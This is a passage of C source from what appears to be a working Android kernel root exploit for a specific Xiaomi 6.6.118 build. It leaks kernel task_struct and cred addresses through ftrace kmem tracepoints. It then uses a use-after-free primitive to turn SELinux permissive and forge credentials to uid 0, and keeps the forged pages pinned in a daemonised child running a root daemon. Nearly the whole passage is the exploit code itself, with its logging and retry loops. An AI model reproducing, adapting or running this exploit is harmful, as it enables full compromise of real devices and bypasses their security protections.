		dprintf(STDOUT_FILENO, "[cred] child %d stayed silent\n",
			g_cred_child_pid);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	n = read(g_report[0], buf, sizeof(buf) - 1);
	if (n < 0) {
		dprintf(STDOUT_FILENO, "[cred] answer read errno=%d\n", errno);
		return -1;
	}
	buf[n > 0 ? n : 0] = 0;
	dprintf(STDOUT_FILENO, "[cred] answer %s", buf);
	if (sscanf(buf, "uid=%u euid=%u", uid, euid) == 2)
		return 0;
	return -1;
}

/*
 * Fixed-size frequency table used only for the failure diagnostics below.
 * Small on purpose: the point is to show the handful of dominant sizes /
 * call sites in the capture window, not to be a real histogram.
 */
struct freq {
	uint64_t key;
	uint32_t n;
};

static void freq_add(struct freq *table, int cap, int *used, uint64_t key)
{
	int i, min;
	for (i = 0; i < *used; i++) {
		if (table[i].key == key) {
			table[i].n++;
			return;
		}
	}
	if (*used < cap) {
		table[*used].key = key;
		table[*used].n = 1;
		(*used)++;
		return;
	}
	min = 0;
	for (i = 1; i < cap; i++)
		if (table[i].n < table[min].n)
			min = i;
	table[min].key = key;
	table[min].n = 1;
}

static void freq_dump(const char *tag, const struct freq *table, int used)
{
	int i;
	dprintf(STDOUT_FILENO, "[task] %s=", tag);
	if (!used)
		dprintf(STDOUT_FILENO, "none");
	for (i = 0; i < used; i++)
		dprintf(STDOUT_FILENO, "%s%#" PRIx64 ":%u", i ? " " : "",
			table[i].key, table[i].n);
	dprintf(STDOUT_FILENO, "\n");
}

/*
 * Locate the task_struct that fork() just allocated.
 *
 * Two keys, in this order:
 *   1. call_site == copy_process+0x140 (profile task_alloc_link). The kmem
 *      tracepoint records _RET_IP_, which for the fork path is the return
 *      address of the kmem_cache_alloc_node() call in copy_process -- a
 *      constant per kernel build and *independent of the slab object size*.
 *   2. bytes_req == sizeof(struct task_struct) -- the historical key, kept
 *      for profiles that predate task_alloc_link (blob < v3).
 *
 * Key 1 exists because on Xiaomi 6.6.118 the size key returned
 * "[task] hits=0 foreign=0": not "wrong pid", but no size match at all.
 * Matching on the call site removes the size assumption entirely.
 */
/* task_struct 缓存的实际尺寸不等于 BTF 里的 sizeof(struct task_struct)。
 *
 * kernel/fork.c:
 *   task_struct_cachep = kmem_cache_create_usercopy("task_struct",
 *           arch_task_struct_size, align,      // align = 0x40
 *           SLAB_PANIC|SLAB_ACCOUNT, useroffset, usersize, NULL);
 *
 * arch_task_struct_size 是 .data 里的运行时变量，本机（红米 K90 至尊
 * 6.6.118-g0908354dac1b / warsaw）地址 0xffffffc08211ae08，镜像初值 0。
 * 实测它只有两个写入点（反汇编 fork_init 段得到，均已核对）：
 *   0xffffffc081d004f4  mov w9,#0x12c0 ; str w9,[x8,#0xe08]      ; 默认值
 *   0xffffffc081d00468  add w8,w8,w9 (w9=0x12c0) ; str w8,[x8]   ; 厂商扩展
 * 后者先用 `cmp x0,#0x400 ; b.ls` 限定追加量上限；超限直接返回 -ENOENT，
 * 不落变量。⇒ object_size = 0x12c0 + extra，extra ∈ [0, 0x400]。
 *
 * 所以 BTF 的 4800 只是 object_size 的下界，slab 记录里的
 *   bytes_req   = s->object_size ∈ [4800, 4800+0x400]
 *   bytes_alloc = ALIGN(object_size, 0x40) 同样落在该窗口内。
 * 用 == TASK_STRUCT_SIZE 精确匹配，在带厂商扩展的内核上会 hits=0。
 *
 * 窗口是安全的：kmalloc 桶里 4096 与 8192 之间没有其它尺寸，fork 期间
 * 也不会有别的专用缓存的 object_size 落在 4800..5824。
 */
#define TASK_VENDOR_EXTRA_MAX 0x400U

static int task_size_in_window(uint64_t v)
{
	if (!TASK_STRUCT_SIZE)
		return 0;
	return v >= TASK_STRUCT_SIZE &&
	       v <= (uint64_t)TASK_STRUCT_SIZE + TASK_VENDOR_EXTRA_MAX;
}

static int leak_task(void)
{
	uint8_t *buf;
	int hits = 0, by_size = 0, by_site = 0, foreign = 0, other = 0;
	size_t scanned = 0;
	int ncpu = cpu_count();
	uint64_t want_site = TASK_ALLOC_LINK ? slide_addr(TASK_ALLOC_LINK) : 0;
	struct freq sizes[12];
	struct freq sites[8];
	int nsizes = 0, nsites = 0;
	uint64_t max_alloc = 0, max_site = 0;
	int have_site = 0;

	if (pipe(g_wake) || pipe(g_report))
		return -1;
	if (arm_kmem_cache_alloc() || trace_off_on())
		return -1;
	g_cred_child_pid = fork();
	if (g_cred_child_pid == 0)
		cred_child();
	if (g_cred_child_pid < 0)
		return -1;
	close(g_wake[0]);
	close(g_report[1]);
	g_wake[0] = g_report[1] = -1;
	write_file(TRACE "/tracing_on", "0\n");
	/* E3：复用全局 raw 缓冲（不再每次 malloc 4MB） */
	buf = raw_buf(4U << 20);
	if (!buf)
		return -1;
	if (ncpu < 1)
		ncpu = 1;
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		size_t used = 0;
		int fd;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd < 0)
			continue;
		for (;;) {
			ssize_t n = read(fd, buf + used, (4U << 20) - used);
			if (n <= 0)
				break;
			used += (size_t)n;
			if (used + 65536 >= (4U << 20))
				break;
		}
		close(fd);
		scanned += used;
		for (size_t i = 8; i + 40 <= used; i++) {
			uint64_t site, ptr, req, alloc;
			uint32_t owner;
			int match, szok;
			/* raw record: [trace_entry @i-8][call_site i][ptr i+8]
			 * [bytes_req i+16][bytes_alloc i+24]; trace_entry.pid
			 * (the task doing the alloc) sits at i-4.
			 * 实测 trace_event_raw_event_kmem_cache_alloc:
			 *   rec+0x18 <- s->object_size (bytes_req)
			 *   rec+0x20 <- s->size        (bytes_alloc) */
			memcpy(&site, buf + i, 8);
			memcpy(&ptr, buf + i + 8, 8);
			memcpy(&req, buf + i + 16, 8);
			memcpy(&alloc, buf + i + 24, 8);
			if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff || (ptr & 7))
				continue;
			if (req < 8 || req > (1U << 22))
				continue;
			/* s->size 必然按 align(0x40) 对齐；object_size 不一定 */
			szok = task_size_in_window(req) ||
			       (task_size_in_window(alloc) && !(alloc & 63));
			memcpy(&owner, buf + i - 4, 4);
			if ((pid_t)owner != getpid()) {
				if (szok)
					foreign++;
				continue;
			}
			freq_add(sizes, 12, &nsizes, alloc);
			freq_add(sites, 8, &nsites, site);
			/* fork 过程中最大的那次 slab 分配就是 task_struct；
			 * 这个值能直接告诉我们本机 arch_task_struct_size 是多少。 */
			if (alloc >= 8 && alloc <= (1U << 20) && alloc > max_alloc) {
				max_alloc = alloc;
				max_site = site;
			}
			if (want_site && site == want_site) {
				match = 1;
				by_site++;
			} else if (szok) {
				match = 2;
				by_size++;
			} else {
				match = 0;
				other++;
			}
			if (!match)
				continue;
			/* call_site 命中是确定性的，优先级高于尺寸窗口；
			 * 一旦拿到 site 命中，就不再让尺寸兜底覆盖它。 */
			if (match == 1) {
				g_task = ptr;
				have_site = 1;
			} else if (!have_site) {
				g_task = ptr;
			}
			hits++;
			dprintf(STDOUT_FILENO,
				"[task] pid=%u by=%s site=%#" PRIx64 " ptr=%#" PRIx64
				" req=%" PRIu64 " alloc=%" PRIu64 "\n",
				owner, match == 1 ? "site" : "size", site, ptr,
				req, alloc);
		}
	}
	/* E3：缓冲由 raw_buf 持有，不在此释放 */
	disarm_kmem_cache_alloc();
	write_file(TRACE "/tracing_on", "0\n");
	dprintf(STDOUT_FILENO,
		"[task] hits=%d by_site=%d by_size=%d foreign=%d other=%d task=%#" PRIx64
		" raw=%zu cpus=%d size=%u..%u want_site=%#" PRIx64
		" max_alloc=%" PRIu64 "@%#" PRIx64 "\n",
		hits, by_site, by_size, foreign, other, g_task, scanned, ncpu,
		TASK_STRUCT_SIZE, TASK_STRUCT_SIZE + TASK_VENDOR_EXTRA_MAX, want_site,
		max_alloc, max_site);
	if (!hits) {
		/* One run must be enough to tell the three failure modes apart:
		 * no records at all -> event never enabled; records but none of
		 * our sizes -> size drift; the fork site present but not matched
		 * -> something even more specific. */
		freq_dump("sizes", sizes, nsizes);
		freq_dump("sites", sites, nsites);
	}
	return hits ? 0 : -1;
}

static int leak_cred(uint64_t *cred)
{
	uint64_t ptrs[8];
	int n;
	if (arm_kmem_cache_alloc())
		return -1;
	if (trace_off_on())
		return -1;
	if (syscall(SYS_setresuid, -1, -1, -1))
		dprintf(STDOUT_FILENO, "[cred] setresuid errno=%d\n", errno);
	write_file(TRACE "/tracing_on", "0\n");
	n = collect_site(slide_addr(CRED_LINK), 184, ptrs, 8);
	dprintf(STDOUT_FILENO, "[cred] ptrs=%d\n", n);
	disarm_kmem_cache_alloc();
	if (n < 1)
		return -1;
	*cred = ptrs[n - 1];
	dprintf(STDOUT_FILENO, "[cred] object=%#" PRIx64 "\n", *cred);
	return 0;
}

static void read_enforce(void)
{
	char buf[8] = { 0 };
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		dprintf(STDOUT_FILENO, "[SELinux] enforce read errno=%d\n", errno);
		return;
	}
	if (read(fd, buf, sizeof(buf) - 1) > 0)
		dprintf(STDOUT_FILENO, "[SELinux] enforce=%s", buf);
	close(fd);
}

static int g_fast;

int pc98260_run_rootd(void);

/*
 * R1：从 uaf_plant_main 抽出的参数解析。
 *
 * 返回 daemon_exit（1 = 注入成功后主进程退出，页面交由 cred 子进程驻留）。
 * 未识别的参数维持原行为——静默忽略；宿主固定只传
 * --slide / --page-offset / --daemon-exit。
 */
static int parse_args(int argc, char **argv)
{
	int daemon_exit = 0;
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--slide") && i + 1 < argc)
			g_slide = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--page-offset") && i + 1 < argc)
			g_page_offset = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--daemon-exit"))
			daemon_exit = 1;
	}
	return daemon_exit;
}

int uaf_plant_main(int argc, char **argv)
{
	struct sigaction action = { .sa_handler = on_alarm };

	// initialize offset table (from kernel_table)
	if (init_offsets() != 0) {
		fprintf(stderr, "[config] error: failed to init kernel offset table\n");
		return 1;
	}

	if (argc > 1 && !strcmp(argv[1], "--exec-ok"))
		_exit(0);
	/* --daemon-exit: after the plant succeeds, hand the pages over to a detached
	 * daemon child and let this process return, so the caller (host) is not
	 * blocked on a process that has to live forever.
	 * R1：解析逻辑已抽出为 parse_args。 */
	int daemon_exit = parse_args(argc, argv);
	dprintf(STDOUT_FILENO, "[mode] daemon_exit=%d\n", daemon_exit);
	dprintf(STDOUT_FILENO, "[slide] %#" PRIx64 "\n", g_slide);
	g_fast = getenv("PLANT_FAST") != NULL;
	dprintf(STDOUT_FILENO, "[mode] fast=%d\n", g_fast);
	log_sync();
	print_cfg();
	if (argc > 1 && argv[1][0] != '-')
		g_shift = (unsigned)atoi(argv[1]);
	sigaction(SIGALRM, &action, NULL);
	ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (ipc == MAP_FAILED)
		return 1;
	memset(ipc, 0, sizeof(*ipc));
	if (pin_cpu(0))
		return 1;
	g_ctx = calloc(MAX_RINGS, sizeof(*g_ctx));
	if (!g_ctx)
		return 1;
	dprintf(STDOUT_FILENO, "[id] uid=%u euid=%u gid=%u\n",
		getuid(), geteuid(), getgid());
	read_enforce();
	g_nrings = 0;
	if (write_file(TRACE "/buffer_size_kb", "16384\n"))
		dprintf(STDOUT_FILENO, "[warn] buffer_size_kb not writable, continuing\n");
	if (leak_task()) {
		dprintf(STDOUT_FILENO, "[task] leak failed\n");
		disarm();
		return 5;
	}
	g_plant_cred = 0;
	{
		uint64_t sel = slide_addr(SELINUX_LINK) - 7;
		for (int i = 1; i <= 12; i++) {
			char buf[8] = { 0 };
			int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
			if (fd >= 0) {
				if (read(fd, buf, 1) < 0)
					buf[0] = 0;
				close(fd);
			}
			if (buf[0] == '0') {
				dprintf(STDOUT_FILENO, "[selinux] already permissive\n");
				break;
			}
			dprintf(STDOUT_FILENO,
				"[selinux] attempt %d/12 target=%#" PRIx64 "\n",
				i, sel);
			if (!one_uaf(sel))
				read_enforce();
		}
	}
	g_plant_cred = 1;
	int rooted = 0;
	for (int attempt = 1; attempt <= 12 && !rooted; attempt++) {
		unsigned uid = 1, euid = 1;
		int fixed_uid = -1, fixed_suid = -1;
		dprintf(STDOUT_FILENO, "[cred] plant attempt %d/12\n", attempt);
		g_plant_cred = 1;
		if (one_uaf(0))
			continue;
		g_plant_cred = 0;
		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
		log_sync();
		log_proc_uid(g_cred_child_pid);
		for (int i = 0; i < 3 && fixed_uid; i++)
			fixed_uid = one_uaf(g_cred_kva + 8);
		for (int i = 0; i < 3 && fixed_suid; i++)
			fixed_suid = one_uaf(g_cred_kva + 16);
		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
			rooted = 1;
		else if (uid == 1 && euid == 1)
			dprintf(STDOUT_FILENO, "[cred] child did not answer\n");
		else
			dprintf(STDOUT_FILENO, "[cred] still uid=%u euid=%u\n", uid, euid);
	}
	if (!rooted) {
		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
		for (;;)
			pause();
	}
	dprintf(STDOUT_FILENO, "[cred] child=%d holding pages (parent pid=%d)\n",
		g_cred_child_pid, getpid());
	log_sync();
	/*
	 * Two exit models.
	 *
	 * --daemon-exit (the model the host uses): tell the cred child to detach
	 * itself, then return. This process must not be the one that lives forever;
	 * the child keeps the forged cred pages referenced and stays reachable for
	 * the platform (it becomes a session leader with stdio on /dev/null).
	 *
	 * Without the flag: stay resident and wait for the child (reference
	 * implementation behaviour). The stop-file forwarding below is a leftover of
	 * the old inline-rootd design - the child now blocks every signal and runs
	 * rootd in a fork, so this is a diagnostic path only.
	 */
	if (daemon_exit) {
		unsigned char daemon_cmd = 0xAA;
		if (write(g_wake[1], &daemon_cmd, 1) == 1) {
			dprintf(STDOUT_FILENO, "[cred] sent daemon command to child\n");
			log_sync();
			char ack[32];
			ssize_t got = read(g_report[0], ack, sizeof(ack) - 1);
			if (got > 0) {
				ack[got] = 0;
				dprintf(STDOUT_FILENO, "[cred] child ack: %s", ack);
			}
			close(g_wake[1]);
			close(g_report[0]);
			dprintf(STDOUT_FILENO,
				"[cred] main process exiting, child becomes daemon\n");
			return 0;
		}
		dprintf(STDOUT_FILENO, "[cred] failed to send daemon command\n");
	}
	int ticks = 0;
	int sent_term = 0;
	int term_warned = 0;
	int term_deadline = 0;
	for (;;) {
		int status = 0;
		pid_t done = waitpid(g_cred_child_pid, &status, WNOHANG);
		if (done == g_cred_child_pid) {
			dprintf(STDOUT_FILENO,
				"[cred] child exited (status=%d), releasing pages\n",
				status);
			break;
		}
		if (done < 0 && errno != EINTR) {
			dprintf(STDOUT_FILENO, "[cred] waitpid failed errno=%d\n", errno);
			break;
		}
		if (!sent_term && access(pc98260_rootd_stop_path(), F_OK) == 0) {
			(void)kill(g_cred_child_pid, SIGTERM);
			dprintf(STDOUT_FILENO,
				"[cred] stop file seen, sent SIGTERM to child %d\n",
				g_cred_child_pid);
			sent_term = 1;
			/* 15s = 75 ticks of 200ms. */
			term_deadline = ticks + 75;
		}
		if (sent_term && !term_warned && ticks >= term_deadline) {
			/* Never escalate to SIGKILL: the child still references the forged
			 * cred, so killing it would panic the kernel. Keeping the pages
			 * pinned leaks memory but keeps the device alive. */
			dprintf(STDOUT_FILENO,
				"[cred] warn: child %d ignored SIGTERM after 15s, keeping pages pinned\n",
				g_cred_child_pid);
			term_warned = 1;
		}
		/* Heartbeat: proves on the next device run whether this loop is alive
		 * and whether the child is still running (a stuck child means rootd
		 * never returned). */
		if (++ticks % 5 == 0) {
			char alive = (kill(g_cred_child_pid, 0) == 0) ? '1' : '0';
			/* ticks are 200ms each, so one second is ticks/5. The old
			 * "ticks * 5" label overstated elapsed time by 25x and made the
			 * device log read "25 s" after roughly one real second. */
			dprintf(STDOUT_FILENO,
				"[cred] waiting for child %d (alive=%c) %ds term=%d phase=%d\n",
				g_cred_child_pid, alive, ticks / 5, sent_term,
				pc98260_rootd_phase());
		}
		struct timespec nap = { .tv_sec = 0, .tv_nsec = 200000000L };
		nanosleep(&nap, NULL);
	}
	free_aio_hold();
	close_stream();
	dprintf(STDOUT_FILENO, "[uaf] exploit finished, exiting cleanly\n");
	return 0;
}
